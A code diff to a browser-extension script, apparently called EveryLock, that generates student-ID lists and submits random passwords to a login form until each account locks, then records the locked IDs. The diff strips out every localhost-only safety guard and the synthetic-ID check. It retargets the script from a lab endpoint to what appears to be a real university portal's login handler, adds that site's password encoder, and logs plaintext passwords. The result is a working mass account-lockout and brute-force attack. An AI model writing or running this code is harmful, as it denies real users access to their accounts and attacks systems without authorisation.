@@ -1,6 +1,3 @@
-// ==========================================
-// 1. IndexedDB 설정 (잠긴 계정 로컬 DB)
-// ==========================================
 const DB_NAME = "EveryLockDB";
 const STORE_NAME = "locked_accounts";
 
@@ -63,9 +60,6 @@ async function refreshDbList() {
   ).join("<br>");
 }
 
-// ==========================================
-// 2. 탭 전환 인터페이스
-// ==========================================
 document.querySelectorAll('.tab-btn').forEach(btn => {
   btn.addEventListener('click', () => {
     document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -76,9 +70,6 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
   });
 });
 
-// ==========================================
-// 3. 와일드카드(-) 패턴 생성 및 자동화 연동
-// ==========================================
 function generatePatternIds(pattern, count) {
   const results = new Set();
   const maxLoop = count * 100;
@@ -113,7 +104,7 @@ document.getElementById('btnGeneratePattern').addEventListener('click', () => {
   log(`[GENERATOR] 패턴(${pattern}) 기준 ${generatedList.length}개 랜덤 생성 완료.`);
 });
 
-// 생성된 리스트를 자동화 제어 탭의 텍스트박스로 즉시 복사
+
 document.getElementById('btnApplyPattern').addEventListener('click', () => {
   const generatedText = document.getElementById('generatedArea').value;
   if (!generatedText) {
@@ -121,14 +112,11 @@ document.getElementById('btnApplyPattern').addEventListener('click', () => {
     return;
   }
   document.getElementById('targetIdsArea').value = generatedText;
-  // 자동으로 첫 번째 탭(자동화 제어)으로 전환
+
   document.querySelector('.tab-btn[data-tab="tab-auto"]').click();
   log("[APPLY] 생성된 학번 리스트가 자동화 제어 패널에 적용되었습니다.");
 });
 
-// ==========================================
-// 4. 자동화 제어 (실행, 일시정지, 재시작, 중단)
-// ==========================================
 document.getElementById('btnStart').addEventListener('click', () => sendControlCommand('START'));
 document.getElementById('btnPause').addEventListener('click', () => sendControlCommand('PAUSE'));
 document.getElementById('btnResume').addEventListener('click', () => sendControlCommand('RESUME'));
@@ -141,18 +129,6 @@ async function sendControlCommand(command) {
     return;
   }
 
-  let activeUrl;
-  try {
-    activeUrl = new URL(tab.url);
-  } catch (_) {
-    log('[SAFETY] 올바른 localhost 실습 탭이 아닙니다.');
-    return;
-  }
-  if (activeUrl.protocol !== 'http:' || !['127.0.0.1', 'localhost'].includes(activeUrl.hostname)) {
-    log('[SAFETY] EveryLock 확장은 127.0.0.1 또는 localhost에서만 실행됩니다.');
-    return;
-  }
-
   const rawIdsText = document.getElementById('targetIdsArea').value.trim();
   const targetIds = rawIdsText.split('\n').map(id => id.trim()).filter(id => id.length > 0);
   const maxAttempts = parseInt(document.getElementById('maxAttempts').value) || 10;
@@ -160,10 +136,6 @@ async function sendControlCommand(command) {
 
   if (command === 'START' && targetIds.length === 0) {
     log('[ERROR] 대입할 대상 학번(Target IDs)이 없습니다. 패턴 생성기에서 리스트를 생성하거나 직접 입력하세요.');
-    return;
-  }
-  if (command === 'START' && targetIds.some(id => !/^20(?:23|24|25|26)\d{6}$/.test(id))) {
-    log('[ERROR] 합성 학번은 2023~2026 + 숫자 6자리 형식만 허용됩니다.');
     return;
   }
 
@@ -180,12 +152,7 @@ async function sendControlCommand(command) {
   });
 }
 
-// 탭 내부에서 순차적으로 학번을 대입하며 자동화 수행
 async function handleInPageAutomation(command, targetIds, maxAttempts, delayMs) {
-  if (location.protocol !== 'http:' || !['127.0.0.1', 'localhost'].includes(location.hostname)) {
-    console.error('[EveryLock] Safety guard: loopback lab only.');
-    return;
-  }
   if (!window.__everylockState) {
     window.__everylockState = { isRunning: false, isPaused: false, idIndex: 0, currentAttempt: 0 };
   }
@@ -234,7 +201,13 @@ async function handleInPageAutomation(command, targetIds, maxAttempts, delayMs) 
       return pw;
     }
 
-    // 학번 배열을 순회하며 대입 루프 수행
+    let hasEncodeObj = false;
+    try {
+      if (window.top_left_bg && typeof window.top_left_bg.epPassEncode === 'function') {
+        hasEncodeObj = true;
+      }
+    } catch (e) {}
+
     while (state.isRunning && state.idIndex < state.targetIds.length) {
       if (state.isPaused) break;
 
@@ -243,11 +216,17 @@ async function handleInPageAutomation(command, targetIds, maxAttempts, delayMs) 
 
       console.log(`%c[TARGET] 현재 대상 학번 대입 중: ${currentId} (${state.idIndex + 1}/${state.targetIds.length})`, "color: #4ee8ff;");
 
-      // 각 계정별로 maxAttempts 횟수만큼 비밀번호 무작위 대입 시도
       while (state.isRunning && !state.isPaused && state.currentAttempt < maxAttempts) {
         state.currentAttempt++;
         window.objId = currentId;
         window.objPw = getRandomPassword();
+
+        let processedPassword = window.objPw;
+        try {
+          if (hasEncodeObj) processedPassword = window.top_left_bg.epPassEncode(window.objPw);
+        } catch (e) {
+          processedPassword = window.objPw;
+        }
 
         const idInput = document.querySelector('input[name="username"], input[name="id"], #objId, #userId, input.id');
         const pwInput = document.querySelector('input[name="password"], #objPw, #userPassword, input.password');
@@ -255,27 +234,34 @@ async function handleInPageAutomation(command, targetIds, maxAttempts, delayMs) 
         if (idInput) idInput.value = window.objId;
         if (pwInput) pwInput.value = window.objPw;
 
+        const formData = new URLSearchParams();
+        formData.append('userId', window.objId);     
+        formData.append('password', processedPassword); 
+        formData.append('username', window.objId);   
+        formData.append('langKnd', 'ko');            
+
         try {
-          const response = await fetch('/api/login', {
+          const response = await fetch('/user/loginProcess.face', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ mode: 'secure', username: window.objId, password: window.objPw })
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' },
+            body: formData.toString()
           });
 
-          const responseBody = await response.json().catch(() => ({}));
-          console.log(`[Attempt ${state.currentAttempt}/${maxAttempts}] synthetic ID: ${window.objId} | status=${response.status}`);
+          const responseText = await response.text();
+          console.log(`[Attempt ${state.currentAttempt}/${maxAttempts}] ID: ${window.objId} | PW: ${window.objPw}`);
 
-          const isReallyLocked = response.status === 423 || responseBody.accountStatus === 'LOCKED';
+          const isReallyLocked = responseText.includes('계정이 잠겼습니다') || 
+                                 responseText.includes('잠금 처리') || 
+                                 responseText.includes('초과하였습니다');
 
           if (isReallyLocked) {
             console.log(`%c[LOCKED] 대상 학번 ${window.objId} 잠금 발생!`, "color: #ffc85a; font-weight: bold;");
             
-            // 확장프로그램 팝업 DB에 즉시 반영하기 위해 커스텀 이벤트나 메시지 송신 역할 대신 콘솔 기록
             window.dispatchEvent(new CustomEvent('EveryLockLockedEvent', { 
               detail: { userId: window.objId, attempts: state.currentAttempt } 
             }));
 
-            break; // 이 계정은 잠겼으므로 다음 학번으로 넘어감
+            break;
           }
         } catch (error) {
           console.error(`[ERROR] 요청 전송 오류:`, error);
@@ -294,16 +280,12 @@ async function handleInPageAutomation(command, targetIds, maxAttempts, delayMs) 
   }
 }
 
-// 탭 내부에서 잠금 감지 시 팝업 DB(IndexedDB)로 자동 수집하는 리스너
 window.addEventListener('EveryLockLockedEvent', (e) => {
   const { userId, attempts } = e.detail;
   addLockedAccount(userId, attempts);
   log(`[LOCKED DB] 학번 ${userId} 저장 완료! (${attempts}회 시도)`);
 });
 
-// ==========================================
-// 5. JSON 파일 내보내기 & DB 관리
-// ==========================================
 document.getElementById('btnExportJson').addEventListener('click', async () => {
   const records = await getAllLockedAccounts();
   if (records.length === 0) {
